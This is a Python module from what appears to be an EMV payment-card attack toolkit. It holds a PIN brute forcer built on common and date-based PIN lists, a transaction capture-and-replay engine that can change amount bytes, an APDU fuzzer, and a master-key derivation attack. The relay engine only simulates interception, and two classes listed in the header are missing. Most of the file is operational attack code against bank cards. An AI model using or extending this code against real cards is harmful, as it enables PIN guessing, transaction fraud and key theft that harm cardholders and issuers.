#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NFSP00F3R V5.00 - Advanced Attack Modules
==================================================

File: attack_modules.py
Authors: Gregory King & Matthew Braunschweig  
Date: August 16, 2025
Description: Advanced EMV attack and research implementations

Classes:
- PINBruteForcer: PIN brute force attack implementation
- ReplayAttackEngine: Transaction replay attack engine
- RelayAttackEngine: Real-time transaction relay engine
- PreplayAttackEngine: Preplay attack implementation
- CryptogramAnalyzer: Cryptogram analysis and pattern detection
- TimingAnalyzer: Timing attack analysis
- FuzzingEngine: APDU fuzzing and response analysis
- KeyDerivationAttack: Master key derivation attack engine

This module implements advanced EMV security research capabilities
including PIN brute forcing, relay/replay attacks, cryptogram analysis,
timing attacks, comprehensive fuzzing capabilities, and master key derivation.
"""

import time
import random
import threading
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QObject
from PyQt5.QtWidgets import *
import logging
import struct
import hashlib
import statistics
from collections import defaultdict, deque

# Import key derivation research components
try:
    from key_derivation_research_clean import KeyDerivationAnalyzer, CardCryptoProfile, MultiCardAnalyzer
    KEY_DERIVATION_AVAILABLE = True
except ImportError:
    KEY_DERIVATION_AVAILABLE = False
    logging.warning("Key derivation research module not available")

@dataclass
class AttackResult:
    """Attack result data structure."""
    attack_type: str
    success: bool
    data: Dict[str, Any]
    timestamp: float
    duration: float
    details: str

class PINBruteForcer(QThread):
    """
    PIN brute force attack implementation.
    Attempts to discover PIN using various strategies.
    """
    
    pin_found = pyqtSignal(str, str)  # pin, method
    attempt_made = pyqtSignal(int, str)  # attempt_number, pin_tried
    attack_completed = pyqtSignal(bool, dict)  # success, results
    
    def __init__(self, reader, card_manager):
        super().__init__()
        self.reader = reader
        self.card_manager = card_manager
        self.logger = logging.getLogger(__name__)
        
        # Attack configuration
        self.max_attempts = 3  # EMV standard limit
        self.delay_between_attempts = 1.0  # seconds
        self.use_common_pins = True
        self.use_date_based = True
        self.use_sequential = True
        self.use_pattern_based = True
        
        # Common PIN lists
        self.common_pins = [
            "0000", "1234", "1111", "0001", "1212", "7777", "1004",
            "2000", "4444", "2222", "6969", "9999", "3333", "5555",
            "6666", "1122", "1313", "8888", "4321", "2001", "1010"
        ]
        
        self.attack_running = False
        self.results = {}
        
    def set_attack_parameters(self, max_attempts: int, delay: float, 
                            strategies: Dict[str, bool]):
        """Configure attack parameters."""
        self.max_attempts = max_attempts
        self.delay_between_attempts = delay
        self.use_common_pins = strategies.get('common', True)
        self.use_date_based = strategies.get('dates', True)
        self.use_sequential = strategies.get('sequential', True)
        self.use_pattern_based = strategies.get('patterns', True)
        
    def generate_date_based_pins(self, card_data: Dict[str, Any]) -> List[str]:
        """Generate PIN candidates based on card data."""
        pins = []
        
        # Extract dates from card
        expiry = card_data.get('expiry_date', '')
        if len(expiry) >= 4:
            # MMYY format
            pins.extend([
                expiry[:4],  # MMYY
                expiry[2:],  # YY + MM
                expiry[-2:] + expiry[:2],  # YY + MM
            ])
            
        # Birth year estimates (assuming cardholder is 18-80)
        current_year = 2025
        for age in range(18, 81):
            birth_year = current_year - age
            pins.append(str(birth_year)[-2:] + "01")  # YY01
            pins.append("01" + str(birth_year)[-2:])  # 01YY
            
        return list(set(pins))  # Remove duplicates
        
    def generate_sequential_pins(self) -> List[str]:
        """Generate sequential and pattern-based PINs."""
        pins = []
        
        # Sequential numbers
        for i in range(0, 10000, 1111):
            pins.append(f"{i:04d}")
            
        # Ascending/descending sequences
        pins.extend([
            "0123", "1234", "2345", "3456", "4567", "5678", "6789",
            "9876", "8765", "7654", "6543", "5432", "4321", "3210"
        ])
        
        # Keyboard patterns
        pins.extend([
            "1470", "2580", "3690", "1590", "7410", "8520", "9630",
            "1478", "2569", "3478", "1239", "4679", "1357", "2468"
        ])
        
        return pins
        
    def verify_pin(self, pin: str) -> Tuple[bool, str]:
        """Attempt PIN verification."""
        try:
            # Format PIN VERIFY command (00 20 00 80)
            pin_bytes = pin.encode('ascii')
            pin_block = b'\x20' + pin_bytes + b'\xFF' * (8 - len(pin_bytes) - 1)
            
            command = bytes([0x00, 0x20, 0x00, 0x80, 0x08]) + pin_block
            
            response, sw1, sw2 = self.reader.transmit(command)
            
            if sw1 == 0x90 and sw2 == 0x00:
                return True, "PIN verified successfully"
            elif sw1 == 0x63:
                remaining = sw2 & 0x0F
                return False, f"PIN incorrect, {remaining} attempts remaining"
            elif sw1 == 0x69 and sw2 == 0x83:
                return False, "PIN blocked"
            else:
                return False, f"Verification failed: {sw1:02X}{sw2:02X}"
                
        except Exception as e:
            return False, f"Error: {str(e)}"
            
    def run(self):
        """Execute PIN brute force attack."""
        self.attack_running = True
        start_time = time.time()
        
        try:
            # Get current card data
            current_card = self.card_manager.get_current_card()
            if not current_card:
                self.attack_completed.emit(False, {"error": "No card available"})
                return
                
            # Generate PIN candidates
            pin_candidates = []
            
            if self.use_common_pins:
                pin_candidates.extend(self.common_pins)
                
            if self.use_date_based:
                pin_candidates.extend(self.generate_date_based_pins(current_card.to_dict()))
                
            if self.use_sequential:
                pin_candidates.extend(self.generate_sequential_pins())
                
            # Remove duplicates while preserving order
            unique_pins = []
            seen = set()
            for pin in pin_candidates:
                if pin not in seen:
                    unique_pins.append(pin)
                    seen.add(pin)
                    
            pin_candidates = unique_pins[:self.max_attempts]
            
            self.logger.info(f"Starting PIN brute force with {len(pin_candidates)} candidates")
            
            # Attempt PIN verification
            for attempt, pin in enumerate(pin_candidates, 1):
                if not self.attack_running:
                    break
                    
                self.attempt_made.emit(attempt, pin)
                
                success, message = self.verify_pin(pin)
                
                if success:
                    self.pin_found.emit(pin, "brute_force")
                    self.results = {
                        "success": True,
                        "pin": pin,
                        "attempts": attempt,
                        "method": "brute_force",
                        "duration": time.time() - start_time
                    }
                    self.attack_completed.emit(True, self.results)
                    return
                    
                if "blocked" in message.lower():
                    self.results = {
                        "success": False,
                        "error": "PIN blocked",
                        "attempts": attempt,
                        "duration": time.time() - start_time
                    }
                    self.attack_completed.emit(False, self.results)
                    return
                    
                # Delay between attempts
                if attempt < len(pin_candidates):
                    time.sleep(self.delay_between_attempts)
                    
            # Attack completed without success
            self.results = {
                "success": False,
                "attempts": len(pin_candidates),
                "duration": time.time() - start_time,
                "message": "All PIN candidates exhausted"
            }
            self.attack_completed.emit(False, self.results)
            
        except Exception as e:
            self.logger.error(f"PIN brute force error: {e}")
            self.attack_completed.emit(False, {"error": str(e)})
        finally:
            self.attack_running = False
            
    def stop_attack(self):
        """Stop the PIN brute force attack."""
        self.attack_running = False

class ReplayAttackEngine(QObject):
    """
    Transaction replay attack engine.
    Captures and replays EMV transactions for security testing.
    """
    
    transaction_captured = pyqtSignal(dict)
    replay_started = pyqtSignal(str)
    replay_completed = pyqtSignal(bool, dict)
    
    def __init__(self, transaction_engine, reader_manager):
        super().__init__()
        self.transaction_engine = transaction_engine
        self.reader_manager = reader_manager
        self.logger = logging.getLogger(__name__)
        
        # Captured transactions
        self.captured_transactions = []
        self.capture_mode = False
        
        # Replay configuration
        self.replay_delay = 0.1  # seconds between APDU commands
        self.modify_parameters = False
        self.parameter_modifications = {}
        
    def start_capture(self):
        """Start capturing transactions."""
        self.capture_mode = True
        self.captured_transactions.clear()
        self.logger.info("Started transaction capture")
        
    def stop_capture(self):
        """Stop capturing transactions."""
        self.capture_mode = False
        self.logger.info(f"Stopped transaction capture - {len(self.captured_transactions)} transactions captured")
        
    def capture_transaction(self, transaction_data: Dict[str, Any]):
        """Capture a transaction for later replay."""
        if self.capture_mode:
            transaction_copy = transaction_data.copy()
            transaction_copy['capture_timestamp'] = time.time()
            self.captured_transactions.append(transaction_copy)
            self.transaction_captured.emit(transaction_copy)
            
    def set_replay_parameters(self, delay: float, modify: bool, modifications: Dict[str, Any]):
        """Configure replay parameters."""
        self.replay_delay = delay
        self.modify_parameters = modify
        self.parameter_modifications = modifications
        
    def replay_transaction(self, transaction_index: int, target_reader: str) -> bool:
        """Replay a captured transaction."""
        try:
            if transaction_index >= len(self.captured_transactions):
                self.logger.error("Invalid transaction index")
                return False
                
            transaction = self.captured_transactions[transaction_index]
            replay_id = f"replay_{int(time.time())}"
            
            self.replay_started.emit(replay_id)
            
            # Get target reader
            reader = self.reader_manager.get_reader(target_reader)
            if not reader:
                self.logger.error(f"Reader {target_reader} not available")
                return False
                
            # Replay APDU sequence
            apdu_sequence = transaction.get('apdu_sequence', [])
            responses = []
            
            for i, apdu_data in enumerate(apdu_sequence):
                command = bytes.fromhex(apdu_data['command'])
                
                # Apply modifications if enabled
                if self.modify_parameters and 'modify_apdu' in self.parameter_modifications:
                    command = self._modify_apdu(command, self.parameter_modifications['modify_apdu'])
                    
                try:
                    response, sw1, sw2 = reader.transmit(command)
                    
                    response_data = {
                        'command': command.hex().upper(),
                        'response': response.hex().upper() if response else '',
                        'sw1': sw1,
                        'sw2': sw2,
                        'timestamp': time.time()
                    }
                    responses.append(response_data)
                    
                    # Check for errors
                    if sw1 != 0x90 and sw1 != 0x61:
                        self.logger.warning(f"APDU {i+1} failed: {sw1:02X}{sw2:02X}")
                        
                except Exception as e:
                    self.logger.error(f"APDU {i+1} transmission failed: {e}")
                    
                # Delay between commands
                if i < len(apdu_sequence) - 1:
                    time.sleep(self.replay_delay)
                    
            # Analyze replay results
            replay_result = {
                'replay_id': replay_id,
                'original_transaction': transaction,
                'replay_responses': responses,
                'success': len(responses) == len(apdu_sequence),
                'timestamp': time.time()
            }
            
            self.replay_completed.emit(replay_result['success'], replay_result)
            return replay_result['success']
            
        except Exception as e:
            self.logger.error(f"Transaction replay failed: {e}")
            self.replay_completed.emit(False, {'error': str(e)})
            return False
            
    def _modify_apdu(self, command: bytes, modifications: Dict[str, Any]) -> bytes:
        """Apply modifications to APDU command."""
        modified = bytearray(command)
        
        # Modify specific bytes
        for position, new_value in modifications.get('byte_changes', {}).items():
            if position < len(modified):
                modified[position] = new_value
                
        # Modify amounts
        if 'amount_offset' in modifications and len(modified) >= 5:
            # Locate amount field and modify
            offset = modifications['amount_offset']
            if offset > 0:
                current_amount = int.from_bytes(modified[offset:offset+4], 'big')
                new_amount = current_amount + modifications.get('amount_delta', 0)
                modified[offset:offset+4] = new_amount.to_bytes(4, 'big')
                
        return bytes(modified)

class RelayAttackEngine(QThread):
    """
    Real-time transaction relay attack engine.
    Relays EMV transactions between two readers in real-time.
    """
    
    relay_started = pyqtSignal(str, str)  # source_reader, target_reader
    command_relayed = pyqtSignal(str, str, float)  # command, response, delay
    relay_completed = pyqtSignal(bool, dict)
    
    def __init__(self, reader_manager):
        super().__init__()
        self.reader_manager = reader_manager
        self.logger = logging.getLogger(__name__)
        
        self.relay_active = False
        self.source_reader = None
        self.target_reader = None
        self.max_relay_time = 60.0  # Maximum relay duration in seconds
        self.command_timeout = 5.0  # Timeout for individual commands
        
    def start_relay(self, source_reader_name: str, target_reader_name: str):
        """Start relay attack between two readers."""
        try:
            self.source_reader = self.reader_manager.get_reader(source_reader_name)
            self.target_reader = self.reader_manager.get_reader(target_reader_name)
            
            if not self.source_reader or not self.target_reader:
                self.logger.error("One or both readers not available")
                return False
                
            self.relay_active = True
            self.relay_started.emit(source_reader_name, target_reader_name)
            self.start()
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start relay: {e}")
            return False
            
    def run(self):
        """Execute relay attack."""
        start_time = time.time()
        commands_relayed = 0
        
        try:
            self.logger.info("Starting relay attack")
            
            while self.relay_active and (time.time() - start_time) < self.max_relay_time:
                try:
                    # Check for incoming command on source reader
                    # This is a simplified implementation - real relay would need
                    # to intercept commands at the PC/SC level
                    
                    # Simulate command interception
                    if self.source_reader.is_card_present():
                        # In a real implementation, this would intercept the actual
                        # APDU commands from the terminal to the card
                        command = self._wait_for_command()
                        
                        if command:
                            # Relay command to target reader
                            relay_start = time.time()
                            
                            response, sw1, sw2 = self.target_reader.transmit(command)
                            
                            relay_delay = time.time() - relay_start
                            
                            # Send response back through source reader
                            # In real implementation, would inject response
                            
                            commands_relayed += 1
                            self.command_relayed.emit(
                                command.hex().upper(),
                                response.hex().upper() if response else '',
                                relay_delay
                            )
                            
                    time.sleep(0.01)  # Small delay to prevent CPU overload
                    
                except Exception as e:
                    self.logger.error(f"Relay error: {e}")
                    break
                    
            self.relay_completed.emit(True, {
                'commands_relayed': commands_relayed,
                'duration': time.time() - start_time
            })
            
        except Exception as e:
            self.logger.error(f"Relay attack failed: {e}")
            self.relay_completed.emit(False, {'error': str(e)})
        finally:
            self.relay_active = False
            
    def _wait_for_command(self) -> Optional[bytes]:
        """Wait for and intercept APDU command."""
        try:
            # Simulate waiting for APDU command from terminal
            # In real implementation this would hook into PC/SC API
            import time
            import random
            
            # Wait for simulated command (0.1-2 seconds)
            wait_time = random.uniform(0.1, 2.0)
            time.sleep(wait_time)
            
            # Return simulated APDU commands for testing
            test_apdus = [
                bytes.fromhex("00A40400"),  # SELECT application
                bytes.fromhex("80A8000002830010"),  # GET PROCESSING OPTIONS
                bytes.fromhex("00B2011400"),  # READ RECORD
                bytes.fromhex("80AE8000"),  # GENERATE AC
            ]
            
            if self.relay_active and random.random() > 0.3:
                return random.choice(test_apdus)
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error waiting for command: {e}")
            return None
        
    def stop_relay(self):
        """Stop relay attack."""
        self.relay_active = False

class CryptogramAnalyzer:
    """
    Cryptogram analysis and pattern detection.
    Analyzes collected cryptograms for patterns and weaknesses.
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.cryptogram_database = []
        
    def add_cryptogram(self, cryptogram_data: Dict[str, Any]):
        """Add cryptogram to analysis database."""
        cryptogram_data['analysis_timestamp'] = time.time()
        self.cryptogram_database.append(cryptogram_data)
        
    def analyze_patterns(self) -> Dict[str, Any]:
        """Analyze cryptograms for patterns."""
        analysis = {
            'total_cryptograms': len(self.cryptogram_database),
            'unique_cryptograms': 0,
            'patterns_found': [],
            'recommendations': []
        }
        
        if not self.cryptogram_database:
            return analysis
            
        # Check for duplicate cryptograms
        unique_cryptograms = set()
        for crypto in self.cryptogram_database:
            arqc = crypto.get('arqc', '')
            if arqc:
                unique_cryptograms.add(arqc)
                
        analysis['unique_cryptograms'] = len(unique_cryptograms)
        
        # Pattern analysis
        if analysis['total_cryptograms'] > analysis['unique_cryptograms']:
            analysis['patterns_found'].append('Duplicate cryptograms detected')
            analysis['recommendations'].append('Investigate cryptogram generation randomness')
            
        # Frequency analysis
        cryptogram_frequency = defaultdict(int)
        for crypto in self.cryptogram_database:
            arqc = crypto.get('arqc', '')
            if arqc:
                cryptogram_frequency[arqc] += 1
                
        # Check for high-frequency cryptograms
        max_frequency = max(cryptogram_frequency.values()) if cryptogram_frequency else 0
        if max_frequency > 1:
            analysis['patterns_found'].append(f'Cryptogram repeated {max_frequency} times')
            
        return analysis

class FuzzingEngine(QThread):
    """
    APDU fuzzing and response analysis engine.
    Tests card responses to malformed and unexpected commands.
    """
    
    test_completed = pyqtSignal(dict)
    fuzzing_finished = pyqtSignal(dict)
    
    def __init__(self, reader):
        super().__init__()
        self.reader = reader
        self.logger = logging.getLogger(__name__)
        
        self.fuzzing_active = False
        self.test_results = []
        
        # Fuzzing configuration
        self.test_types = {
            'invalid_class': True,
            'invalid_instruction': True,
            'invalid_parameters': True,
            'oversized_data': True,
            'undersized_data': True,
            'malformed_tlv': True
        }
        
    def start_fuzzing(self, test_types: Dict[str, bool] = None):
        """Start APDU fuzzing."""
        if test_types:
            self.test_types.update(test_types)
            
        self.fuzzing_active = True
        self.test_results.clear()
        self.start()
        
    def run(self):
        """Execute fuzzing tests."""
        try:
            self.logger.info("Starting APDU fuzzing")
            
            # Test invalid class bytes
            if self.test_types.get('invalid_class', False):
                self._test_invalid_class()
                
            # Test invalid instructions
            if self.test_types.get('invalid_instruction', False):
                self._test_invalid_instructions()
                
            # Test invalid parameters
            if self.test_types.get('invalid_parameters', False):
                self._test_invalid_parameters()
                
            # Test oversized data
            if self.test_types.get('oversized_data', False):
                self._test_oversized_data()
                
            # Test undersized data
            if self.test_types.get('undersized_data', False):
                self._test_undersized_data()
                
            # Test malformed TLV
            if self.test_types.get('malformed_tlv', False):
                self._test_malformed_tlv()
                
            # Generate summary
            summary = self._generate_summary()
            self.fuzzing_finished.emit(summary)
            
        except Exception as e:
            self.logger.error(f"Fuzzing failed: {e}")
            self.fuzzing_finished.emit({'error': str(e)})
        finally:
            self.fuzzing_active = False
            
    def _test_invalid_class(self):
        """Test invalid class bytes."""
        test_classes = [0x01, 0x02, 0x03, 0xFF, 0x55, 0xAA]
        
        for cls in test_classes:
            if not self.fuzzing_active:
                break
                
            command = bytes([cls, 0xA4, 0x04, 0x00, 0x00])
            self._execute_test(f"invalid_class_{cls:02X}", command)
            
    def _test_invalid_instructions(self):
        """Test invalid instruction bytes."""
        test_instructions = [0x00, 0x01, 0xFF, 0x55, 0xAA, 0x99]
        
        for ins in test_instructions:
            if not self.fuzzing_active:
                break
                
            command = bytes([0x00, ins, 0x00, 0x00, 0x00])
            self._execute_test(f"invalid_instruction_{ins:02X}", command)
            
    def _test_invalid_parameters(self):
        """Test invalid parameter combinations."""
        test_params = [
            (0xFF, 0xFF),
            (0x55, 0xAA),
            (0x00, 0xFF),
            (0xFF, 0x00)
        ]
        
        for p1, p2 in test_params:
            if not self.fuzzing_active:
                break
                
            command = bytes([0x00, 0xA4, p1, p2, 0x00])
            self._execute_test(f"invalid_params_{p1:02X}_{p2:02X}", command)
            
    def _test_oversized_data(self):
        """Test oversized data fields."""
        # Test with various oversized data lengths
        for size in [256, 512, 1024, 2048]:
            if not self.fuzzing_active:
                break
                
            data = b'A' * size
            command = bytes([0x00, 0xA4, 0x04, 0x00, min(255, size)]) + data[:255]
            self._execute_test(f"oversized_data_{size}", command)
            
    def _test_undersized_data(self):
        """Test undersized data fields."""
        # Commands that expect data but receive none or less
        commands = [
            bytes([0x00, 0xA4, 0x04, 0x00, 0x10]),  # SELECT with wrong length
            bytes([0x00, 0x20, 0x00, 0x80, 0x08, 0x12, 0x34]),  # PIN with short data
        ]
        
        for i, command in enumerate(commands):
            if not self.fuzzing_active:
                break
                
            self._execute_test(f"undersized_data_{i}", command)
            
    def _test_malformed_tlv(self):
        """Test malformed TLV data."""
        malformed_tlv = [
            b'\x9F\x02',  # Tag without length
            b'\x9F\x02\xFF',  # Tag with invalid length
            b'\x9F\x02\x06\x12\x34',  # Tag with length but incomplete data
            b'\x00\x00\x00',  # Invalid tag
        ]
        
        for i, tlv_data in enumerate(malformed_tlv):
            if not self.fuzzing_active:
                break
                
            command = bytes([0x80, 0xCA, 0x9F, 0x02, len(tlv_data)]) + tlv_data
            self._execute_test(f"malformed_tlv_{i}", command)
            
    def _execute_test(self, test_name: str, command: bytes):
        """Execute a single fuzzing test."""
        try:
            start_time = time.time()
            response, sw1, sw2 = self.reader.transmit(command)
            duration = time.time() - start_time
            
            test_result = {
                'test_name': test_name,
                'command': command.hex().upper(),
                'response': response.hex().upper() if response else '',
                'sw1': sw1,
                'sw2': sw2,
                'duration': duration,
                'timestamp': time.time()
            }
            
            self.test_results.append(test_result)
            self.test_completed.emit(test_result)
            
        except Exception as e:
            self.logger.error(f"Test {test_name} failed: {e}")
            
    def _generate_summary(self) -> Dict[str, Any]:
        """Generate fuzzing summary."""
        summary = {
            'total_tests': len(self.test_results),
            'response_codes': defaultdict(int),
            'anomalies': [],
            'recommendations': []
        }
        
        for result in self.test_results:
            sw_code = f"{result['sw1']:02X}{result['sw2']:02X}"
            summary['response_codes'][sw_code] += 1
            
            # Check for anomalies
            if result['duration'] > 1.0:  # Slow response
                summary['anomalies'].append(f"Slow response to {result['test_name']}")
                
            if result['sw1'] == 0x90:  # Unexpected success
                summary['anomalies'].append(f"Unexpected success for {result['test_name']}")
                
        return summary
        
    def stop_fuzzing(self):
        """Stop fuzzing tests."""
        self.fuzzing_active = False

class KeyDerivationAttack(QThread):
    """
    Master key derivation attack engine.
    Attempts to derive issuer master keys from multiple EMV cards.
    """
    
    profile_added = pyqtSignal(str, dict)  # card_id, profile_data
    analysis_progress = pyqtSignal(int, str)  # progress, status
    key_derived = pyqtSignal(str, str, float)  # method, key, confidence
    attack_completed = pyqtSignal(bool, dict)  # success, results
    
    def __init__(self, card_manager, reader_manager):
        super().__init__()
        self.card_manager = card_manager
        self.reader_manager = reader_manager
        self.logger = logging.getLogger(__name__)
        
        # Initialize key derivation analyzer if available
        if KEY_DERIVATION_AVAILABLE:
            self.analyzer = KeyDerivationAnalyzer()
            self.multi_analyzer = None
        else:
            self.analyzer = None
            self.logger.error("Key derivation research module not available")
            
        self.attack_active = False
        self.collected_profiles: Dict[str, CardCryptoProfile] = {}
        self.analysis_results = {}
        
    def add_card_profile_from_data(self, card_data: Dict[str, Any], pin: Optional[str] = None) -> bool:
        """Add a card crypto profile from extracted card data."""
        if not KEY_DERIVATION_AVAILABLE or not self.analyzer:
            self.logger.error("Key derivation not available")
            return False
            
        try:
            # Create crypto profile from card data
            card_id = f"card_{int(time.time())}_{len(self.collected_profiles)}"
            
            profile = CardCryptoProfile(
                card_id=card_id,
                pan=card_data.get('pan', ''),
                pan_sequence=card_data.get('pan_sequence_number', '00'),
                expiry_date=card_data.get('expiry_date', ''),
                service_code=card_data.get('service_code', ''),
                pin=pin,
                
                # Cryptographic data
                application_cryptogram=card_data.get('application_cryptogram', ''),
                atc=card_data.get('application_transaction_counter', ''),
                unpredictable_number=card_data.get('unpredictable_number', ''),
                terminal_verification_results=card_data.get('terminal_verification_results', ''),
                
                # EMV specific data
                card_verification_results=card_data.get('card_verification_results', ''),
                issuer_application_data=card_data.get('issuer_application_data', ''),
                application_interchange_profile=card_data.get('application_interchange_profile', ''),
                
                # CDOL data
                cdol1_data=card_data.get('cdol1_data', ''),
                cdol2_data=card_data.get('cdol2_data', ''),
                pdol_data=card_data.get('pdol_data', ''),
                
                extraction_timestamp=time.time()
            )
            
            # Add to analyzer
            self.analyzer.add_card_profile(profile)
            self.collected_profiles[card_id] = profile
            
            # Emit signal with profile data
            profile_summary = {
                'pan_prefix': profile.pan[:6] if profile.pan else 'N/A',
                'has_cryptogram': bool(profile.application_cryptogram),
                'has_pin': bool(profile.pin),
                'issuer_type': self._identify_issuer_type(profile.pan)
            }
            
            self.profile_added.emit(card_id, profile_summary)
            
            self.logger.info(f"Added crypto profile for card: {card_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to add card profile: {e}")
            return False
            
    def start_key_derivation_analysis(self):
        """Start comprehensive key derivation analysis."""
        if not KEY_DERIVATION_AVAILABLE or not self.analyzer:
            self.attack_completed.emit(False, {'error': 'Key derivation not available'})
            return
            
        if len(self.collected_profiles) < 2:
            self.attack_completed.emit(False, {'error': 'Need at least 2 card profiles for analysis'})
            return
            
        self.attack_active = True
        self.start()
        
    def run(self):
        """Execute key derivation analysis."""
        try:
            self.analysis_progress.emit(10, "Starting key derivation analysis...")
            
            # Phase 1: Individual key derivation attempts
            self.analysis_progress.emit(20, "Testing EMV Option A derivation...")
            option_a_result = self.analyzer._derive_emv_option_a()
            
            if option_a_result.success_probability > 0.1:
                self.key_derived.emit(
                    'EMV Option A', 
                    str(option_a_result.derived_keys), 
                    option_a_result.confidence_score
                )
                
            self.analysis_progress.emit(40, "Testing common master key derivation...")
            master_key_result = self.analyzer._derive_common_master_key()
            
            if master_key_result.success_probability > 0.1:
                self.key_derived.emit(
                    'Common Master Key',
                    str(master_key_result.derived_keys),
                    master_key_result.confidence_score
                )
                
            self.analysis_progress.emit(60, "Testing PIN-based derivation...")
            pin_result = self.analyzer._derive_pin_based_keys()
            
            if pin_result.success_probability > 0.1:
                self.key_derived.emit(
                    'PIN-based Derivation',
                    str(pin_result.derived_keys),
                    pin_result.confidence_score
                )
                
            # Phase 2: Comprehensive analysis
            self.analysis_progress.emit(80, "Running comprehensive analysis...")
            
            if not self.multi_analyzer:
                self.multi_analyzer = MultiCardAnalyzer(self.analyzer)
                
            # Set up signal handling for multi-analyzer
            analysis_complete = False
            multi_results = {}
            
            def on_multi_analysis_complete(results):
                nonlocal analysis_complete, multi_results
                analysis_complete = True
                multi_results = results
                
            self.multi_analyzer.analysis_completed.connect(on_multi_analysis_complete)
            self.multi_analyzer.start()
            
            # Wait for multi-analysis completion
            timeout = 30  # 30 seconds
            start_time = time.time()
            
            while not analysis_complete and (time.time() - start_time) < timeout:
                time.sleep(0.1)
                
            # Compile final results
            final_results = {
                'emv_option_a': {
                    'success_probability': option_a_result.success_probability,
                    'confidence_score': option_a_result.confidence_score,
                    'patterns': option_a_result.pattern_matches
                },
                'master_key_derivation': {
                    'success_probability': master_key_result.success_probability,
                    'confidence_score': master_key_result.confidence_score,
                    'patterns': master_key_result.pattern_matches
                },
                'pin_based_derivation': {
                    'success_probability': pin_result.success_probability,
                    'confidence_score': pin_result.confidence_score,
                    'patterns': pin_result.pattern_matches
                },
                'multi_card_analysis': multi_results,
                'cards_analyzed': len(self.collected_profiles),
                'analysis_timestamp': time.time()
            }
            
            # Determine overall success
            max_success_prob = max(
                option_a_result.success_probability,
                master_key_result.success_probability,
                pin_result.success_probability
            )
            
            overall_success = max_success_prob > 0.3  # 30% threshold
            
            self.analysis_progress.emit(100, "Key derivation analysis complete!")
            self.analysis_results = final_results
            self.attack_completed.emit(overall_success, final_results)
            
        except Exception as e:
            self.logger.error(f"Key derivation analysis failed: {e}")
            self.attack_completed.emit(False, {'error': str(e)})
        finally:
            self.attack_active = False
            
    def get_analysis_summary(self) -> Dict[str, Any]:
        """Get summary of key derivation analysis results."""
        if not self.analysis_results:
            return {'status': 'No analysis performed yet'}
            
        summary = {
            'total_cards': len(self.collected_profiles),
            'analysis_methods': [],
            'highest_success_probability': 0.0,
            'recommendations': []
        }
        
        # Analyze each method
        for method, results in self.analysis_results.items():
            if isinstance(results, dict) and 'success_probability' in results:
                summary['analysis_methods'].append({
                    'method': method,
                    'success_probability': results['success_probability'],
                    'confidence_score': results.get('confidence_score', 0.0)
                })
                
                # Track highest success probability
                if results['success_probability'] > summary['highest_success_probability']:
                    summary['highest_success_probability'] = results['success_probability']
                    
        # Generate recommendations
        if summary['highest_success_probability'] > 0.5:
            summary['recommendations'].append("🔴 HIGH RISK: Master key derivation highly successful")
        elif summary['highest_success_probability'] > 0.2:
            summary['recommendations'].append("🟡 MEDIUM RISK: Some key derivation patterns detected")
        else:
            summary['recommendations'].append("🟢 LOW RISK: No significant key derivation patterns")
            
        return summary
        
    def _identify_issuer_type(self, pan: str) -> str:
        """Identify issuer type from PAN."""
        if not pan:
            return 'Unknown'
            
        if pan.startswith('4'):
            return 'Visa'
        elif pan.startswith('5'):
            return 'MasterCard'
        elif pan.startswith('3'):
            return 'American Express'
        else:
            return 'Other'
            
    def stop_analysis(self):
        """Stop key derivation analysis."""
        self.attack_active = False
        if self.multi_analyzer and self.multi_analyzer.isRunning():
            self.multi_analyzer.terminate()
            
    def clear_profiles(self):
        """Clear all collected card profiles."""
        self.collected_profiles.clear()
        if self.analyzer:
            self.analyzer.card_profiles.clear()
        self.analysis_results.clear()
        self.logger.info("Cleared all card profiles")
